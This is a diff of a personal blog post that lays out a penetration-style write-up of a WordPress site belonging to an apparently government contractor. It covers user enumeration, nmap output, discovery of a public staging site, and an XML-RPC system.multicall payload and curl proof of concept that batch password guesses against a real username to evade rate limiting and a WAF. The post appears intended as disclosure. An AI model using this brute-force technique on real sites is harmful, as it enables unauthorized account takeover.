@@ -6,20 +6,22 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Security analysis of XML-RPC misconfiguration and publicly accessible staging environment in WordPress deployment">
+    <meta name="description" content="wordpress &amp; its subsequent dangers">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment">
+<meta property="og:title" content="wordPress xml-rpc vulnerability on a gov&#39;t contractor">
 <meta property="og:url" content="https://rivers.sh/posts/xmlrpc/index.html">
 <meta property="og:site_name" content="River">
-<meta property="og:description" content="Security analysis of XML-RPC misconfiguration and publicly accessible staging environment in WordPress deployment">
+<meta property="og:description" content="wordpress &amp; its subsequent dangers">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rivers.sh/images/xmlrpc/wappalyzer.png">
+<meta property="og:image" content="https://rivers.sh/images/xmlrpc/dorking.png">
 <meta property="article:published_time" content="2025-12-09T05:00:00.000Z">
-<meta property="article:modified_time" content="2026-01-28T20:48:59.965Z">
+<meta property="article:modified_time" content="2026-02-27T05:47:53.565Z">
 <meta property="article:author" content="River">
 <meta property="article:tag" content="Web">
 <meta property="article:tag" content="Pentesting">
-<meta property="article:tag" content="Security Research">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rivers.sh/images/xmlrpc/wappalyzer.png">
     
     
       
@@ -39,7 +41,7 @@
       
     
     <!-- title -->
-    <title>WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment</title>
+    <title>wordPress xml-rpc vulnerability on a gov&#39;t contractor</title>
     <!-- async scripts -->
     <!-- Google Analytics -->
 
@@ -104,23 +106,23 @@
     <div id="share" style="display: none">
       <ul>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/xmlrpc/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/xmlrpc/&text=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/xmlrpc/&title=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/xmlrpc/&is_video=false&description=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment&body=Check out this article: https://rivers.sh/posts/xmlrpc/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/xmlrpc/&title=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/xmlrpc/&title=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/xmlrpc/&title=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/xmlrpc/&title=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/xmlrpc/&name=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/xmlrpc/&t=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/xmlrpc/&text=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/xmlrpc/&title=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/xmlrpc/&is_video=false&description=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=wordPress xml-rpc vulnerability on a gov&#39;t contractor&body=Check out this article: https://rivers.sh/posts/xmlrpc/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/xmlrpc/&title=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/xmlrpc/&title=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/xmlrpc/&title=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/xmlrpc/&title=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/xmlrpc/&name=wordPress xml-rpc vulnerability on a gov&#39;t contractor&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/xmlrpc/&t=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#password-form-container"><span class="toc-number">1.</span> <span class="toc-text">WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#initial-recon-user-enum"><span class="toc-number">1.</span> <span class="toc-text">initial recon + user enum</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#port-scan-discovery"><span class="toc-number">2.</span> <span class="toc-text">port scan + discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#subdomain-enumeration-and-Discovery"><span class="toc-number">3.</span> <span class="toc-text">subdomain enumeration and Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poking-around-staging-branch"><span class="toc-number">4.</span> <span class="toc-text">poking around staging branch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xml-rpc-security-implications"><span class="toc-number">5.</span> <span class="toc-text">xml-rpc security implications</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#system-multicall-Attack-Vector"><span class="toc-number">5.1.</span> <span class="toc-text">system.multicall() Attack Vector</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proof-of-concept"><span class="toc-number">5.2.</span> <span class="toc-text">proof of concept</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#additional-User-Enumeration-via-WPScan"><span class="toc-number">6.</span> <span class="toc-text">additional User Enumeration via WPScan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#disclosure"><span class="toc-number">7.</span> <span class="toc-text">disclosure</span></a></li></ol>
       </div>
     
   </span>
@@ -133,7 +135,7 @@
   <header>
     
     <h1 class="posttitle p-name" itemprop="name headline">
-        WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment
+        wordPress xml-rpc vulnerability on a gov&#39;t contractor
     </h1>
 
 
@@ -161,7 +163,7 @@
       
     <div class="article-tag">
         <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>, <a class="p-category" href="/tags/Security-Research/" rel="tag">Security Research</a>, <a class="p-category" href="/tags/Web/" rel="tag">Web</a>
+        <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>, <a class="p-category" href="/tags/Web/" rel="tag">Web</a>
     </div>
 
 
@@ -169,358 +171,50 @@
   </header>
   
   <!-- Display the description -->
-  <div class="post-description">Security analysis of XML-RPC misconfiguration and publicly accessible staging environment in WordPress deployment</div>
+  <div class="post-description">wordpress & its subsequent dangers</div>
 
   
 
   <div class="content e-content" itemprop="articleBody">
-    <style>/* Gruvbox Theme */
-#password-protected-content {
-  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-  color: #d5c4a1;
-}
+    <h2 id="initial-recon-user-enum"><a href="#initial-recon-user-enum" class="headerlink" title="initial recon + user enum"></a>initial recon + user enum</h2><p>went into this with hackthebox methodology&#x2F;mindset, since im not a bug bounty hunter (though i’d love to improve at it one day of course)</p>
+<p><img src="/images/xmlrpc/wappalyzer.png" alt="wap"><br>no immediately exploitable CVEs sadly</p>
+<p>manual enumeration revealed the following security issues:</p>
+<ul>
+<li>user enumeration works<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">river@<span class="built_in">arch</span>:~ $ curl -s <span class="string">&quot;https://&lt;SITE&gt;.com/?author=1&quot;</span> -L | grep -i <span class="string">&quot;author|redirect&quot;</span></span><br><span class="line"></span><br><span class="line">&lt;title&gt;&lt;REDACTED&gt;, Author at &lt;REDACTED&gt;&lt;/title&gt;</span><br><span class="line">        &lt;<span class="built_in">link</span> rel=<span class="string">&quot;canonical&quot;</span> href=<span class="string">&quot;https://&lt;SITE&gt;.com/author/admin/&quot;</span> /&gt;</span><br><span class="line">        &lt;<span class="built_in">link</span> rel=<span class="string">&quot;next&quot;</span> href=<span class="string">&quot;https://&lt;SITE&gt;.com/author/admin/page/2/&quot;</span> /&gt;</span><br><span class="line">        &lt;meta property=<span class="string">&quot;og:title&quot;</span> content=<span class="string">&quot;&lt;REDACTED, Author at &lt;REDACTED&gt;&quot;</span> /&gt;</span><br><span class="line">        &lt;meta property=<span class="string">&quot;og:url&quot;</span> content=<span class="string">&quot;https://&lt;SITE&gt;.com/author/admin/&quot;</span> /&gt;</span><br><span class="line">﻿</span><br><span class="line"> </span><br></pre></td></tr></table></figure></li>
+<li>xml-rpc is disabled</li>
+<li>password reset url: <code>/dev-login/?action=lostpassword</code></li>
+<li>wp-config backups blocked but with 403 (should be 404)</li>
+<li>readme.html exposed (200) - should be 404</li>
+</ul>
+<p>most significant issue identified during this phase was the working user enumeration capability. multiple valid usernames were successfully enumerated through this method.</p>
+<h2 id="port-scan-discovery"><a href="#port-scan-discovery" class="headerlink" title="port scan + discovery"></a>port scan + discovery</h2><p>hit a brick wall with web-based enumeration, so went back to basics (NMAP)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">river@<span class="built_in">arch</span>:~ $ nmap -sV -sC -T4 &lt;SITE&gt;.com</span><br><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-09 12:49 -0500</span><br><span class="line">Nmap scan report <span class="keyword">for</span> &lt;SITE&gt;.com (172.67.213.5)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Other addresses <span class="keyword">for</span> &lt;SITE&gt;.com (not scanned): 104.21.77.239 2606:4700:3030::ac43:d505 2606:4700:3037::6815:4def</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">80/tcp   open  http     Cloudflare http proxy</span><br><span class="line">|_http-title: Did not follow redirect to https://&lt;SITE&gt;.com/</span><br><span class="line">|_http-server-header: cloudflare</span><br><span class="line">443/tcp  open  ssl/http Cloudflare http proxy</span><br><span class="line">|_http-title: Home - &lt;REDACTED&gt;</span><br><span class="line">|_http-generator: WordPress 6.8.3</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/</span><br><span class="line">| ssl-cert: Subject: commonName=&lt;SITE&gt;.com</span><br><span class="line">| Subject Alternative Name: DNS:&lt;SITE&gt;.com, DNS:*.&lt;SITE&gt;.com</span><br><span class="line">| Not valid before: 2025-10-16T11:21:36</span><br><span class="line">|_Not valid after:  2026-01-14T12:20:04</span><br><span class="line">|_http-server-header: cloudflare</span><br><span class="line">8080/tcp open  http     Cloudflare http proxy</span><br><span class="line">|_http-server-header: cloudflare</span><br><span class="line">|_http-title: Did not follow redirect to https://&lt;SITE&gt;.com:8080/</span><br><span class="line">8443/tcp open  ssl/http Cloudflare http proxy</span><br><span class="line">|_http-server-header: cloudflare</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title.</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=&lt;SITE&gt;.com</span></span><br><span class="line"><span class="string">| Subject Alternative Name: DNS:&lt;SITE&gt;.com, DNS:*.&lt;SITE&gt;.com</span></span><br><span class="line"><span class="string">| Not valid before: 2025-10-16T11:21:36</span></span><br><span class="line"><span class="string">|_Not valid after:  2026-01-14T12:20:04</span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 40.08 seconds</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>ports 8080 and 8443 were discovered in an open state</li>
+<li>a wildcard SSL certificate (<code>*.&lt;SITE&gt;.com</code>) was observed, indicating the potential presence of subdomains</li>
+</ul>
+<h2 id="subdomain-enumeration-and-Discovery"><a href="#subdomain-enumeration-and-Discovery" class="headerlink" title="subdomain enumeration and Discovery"></a>subdomain enumeration and Discovery</h2><p>cba to use feroxbuster so just went with classic dorking</p>
+<p><img src="/images/xmlrpc/dorking.png" alt="dorking"><br>staging branch is literally public ???</p>
+<h2 id="poking-around-staging-branch"><a href="#poking-around-staging-branch" class="headerlink" title="poking around staging branch"></a>poking around staging branch</h2><p>at some point realized some mismatched wordpress versions</p>
+<p>eventually poked around enough to find xml-rpc</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">river@<span class="built_in">arch</span>:~ $ curl -X POST https://staging.&lt;SITE&gt;.com/xmlrpc.php -d <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;/methodCall&gt;&#x27;</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;methodResponse&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">      &lt;array&gt;&lt;data&gt;</span><br><span class="line">  &lt;value&gt;&lt;string&gt;system.multicall&lt;/string&gt;&lt;/value&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="xml-rpc-security-implications"><a href="#xml-rpc-security-implications" class="headerlink" title="xml-rpc security implications"></a>xml-rpc security implications</h2><p>from claude:<br>XML-RPC (Extensible Markup Language Remote Procedure Call) is a legacy protocol that enables remote function calls using XML for encoding and HTTP as the transport mechanism. While XML-RPC provides various functionalities, this analysis focuses specifically on the <code>system.multicall()</code> method due to its security implications.</p>
+<h3 id="system-multicall-Attack-Vector"><a href="#system-multicall-Attack-Vector" class="headerlink" title="system.multicall() Attack Vector"></a>system.multicall() Attack Vector</h3><p>the <code>system.multicall()</code> function allows multiple remote procedure calls to be batched into a single HTTP request. this can be abused to bypass rate limiting and intrusion detection systems</p>
+<p>example:<br>traditional brute-force attack: 100 password attempts &#x3D; 100 individual HTTP requests, which triggers rate limiting and detection mechanisms</p>
+<p>with <code>system.multicall()</code>: 100 password attempts &#x3D; 1 HTTP request, effectively bypassing security controls:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>system.multicall<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">array</span>&gt;</span><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">struct</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>methodName<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>wp.getUsersBlogs<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>params<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>password1<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">struct</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- Repeat for password2, password3... password100 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">data</span>&gt;</span><span class="tag">&lt;/<span class="name">array</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>this would also bypass a WAF</p>
+<h3 id="proof-of-concept"><a href="#proof-of-concept" class="headerlink" title="proof of concept"></a>proof of concept</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">river@<span class="built_in">arch</span>:~ $ curl -s -X POST https://staging.&lt;SITE&gt;.com/xmlrpc.php -d <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;methodCall&gt;</span></span><br><span class="line"><span class="string">  &lt;methodName&gt;system.multicall&lt;/methodName&gt;</span></span><br><span class="line"><span class="string">  &lt;params&gt;</span></span><br><span class="line"><span class="string">    &lt;param&gt;</span></span><br><span class="line"><span class="string">      &lt;value&gt;</span></span><br><span class="line"><span class="string">        &lt;array&gt;</span></span><br><span class="line"><span class="string">          &lt;data&gt;</span></span><br><span class="line"><span class="string">            &lt;value&gt;&lt;struct&gt;</span></span><br><span class="line"><span class="string">              &lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span></span><br><span class="line"><span class="string">              &lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;</span></span><br><span class="line"><span class="string">                &lt;value&gt;&lt;string&gt;interndev&lt;/string&gt;&lt;/value&gt;</span></span><br><span class="line"><span class="string">                &lt;value&gt;&lt;string&gt;admin123&lt;/string&gt;&lt;/value&gt;</span></span><br><span class="line"><span class="string">              &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;</span></span><br><span class="line"><span class="string">            &lt;/struct&gt;&lt;/value&gt;</span></span><br><span class="line"><span class="string">            &lt;value&gt;&lt;struct&gt;</span></span><br><span class="line"><span class="string">              &lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span></span><br><span class="line"><span class="string">              &lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;</span></span><br><span class="line"><span class="string">                &lt;value&gt;&lt;string&gt;interndev&lt;/string&gt;&lt;/value&gt;</span></span><br><span class="line"><span class="string">                &lt;value&gt;&lt;string&gt;test123&lt;/string&gt;&lt;/value&gt;</span></span><br><span class="line"><span class="string">              &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;</span></span><br><span class="line"><span class="string">            &lt;/struct&gt;&lt;/value&gt;</span></span><br><span class="line"><span class="string">            &lt;value&gt;&lt;struct&gt;</span></span><br><span class="line"><span class="string">              &lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span></span><br><span class="line"><span class="string">              &lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;</span></span><br><span class="line"><span class="string">                &lt;value&gt;&lt;string&gt;interndev&lt;/string&gt;&lt;/value&gt;</span></span><br><span class="line"><span class="string">                &lt;value&gt;&lt;string&gt;password123&lt;/string&gt;&lt;/value&gt;</span></span><br><span class="line"><span class="string">              &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;</span></span><br><span class="line"><span class="string">            &lt;/struct&gt;&lt;/value&gt;</span></span><br><span class="line"><span class="string">          &lt;/data&gt;</span></span><br><span class="line"><span class="string">        &lt;/array&gt;</span></span><br><span class="line"><span class="string">      &lt;/value&gt;</span></span><br><span class="line"><span class="string">    &lt;/param&gt;</span></span><br><span class="line"><span class="string">  &lt;/params&gt;</span></span><br><span class="line"><span class="string">&lt;/methodCall&gt;&#x27;</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;methodResponse&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">      &lt;array&gt;&lt;data&gt;</span><br><span class="line">  &lt;value&gt;&lt;struct&gt;</span><br><span class="line">  &lt;member&gt;&lt;name&gt;faultCode&lt;/name&gt;&lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;&lt;/member&gt;</span><br><span class="line">  &lt;member&gt;&lt;name&gt;faultString&lt;/name&gt;&lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span><br><span class="line">&lt;/struct&gt;&lt;/value&gt;</span><br><span class="line">  &lt;value&gt;&lt;struct&gt;</span><br><span class="line">  &lt;member&gt;&lt;name&gt;faultCode&lt;/name&gt;&lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;&lt;/member&gt;</span><br><span class="line">  &lt;member&gt;&lt;name&gt;faultString&lt;/name&gt;&lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span><br><span class="line">&lt;/struct&gt;&lt;/value&gt;</span><br><span class="line">  &lt;value&gt;&lt;struct&gt;</span><br><span class="line">  &lt;member&gt;&lt;name&gt;faultCode&lt;/name&gt;&lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;&lt;/member&gt;</span><br><span class="line">  &lt;member&gt;&lt;name&gt;faultString&lt;/name&gt;&lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span><br><span class="line">&lt;/struct&gt;&lt;/value&gt;</span><br><span class="line">&lt;/data&gt;&lt;/array&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/param&gt;</span><br><span class="line">  &lt;/params&gt;</span><br><span class="line">&lt;/methodResponse&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="additional-User-Enumeration-via-WPScan"><a href="#additional-User-Enumeration-via-WPScan" class="headerlink" title="additional User Enumeration via WPScan"></a>additional User Enumeration via WPScan</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url https://staging.&lt;SITE&gt;.com --enumerate u --plugins-detection passive --random-user-agent</span><br><span class="line">[+] XML-RPC seems to be enabled: https://staging.&lt;SITE&gt;.com/xmlrpc.php</span><br><span class="line"> | Found By: 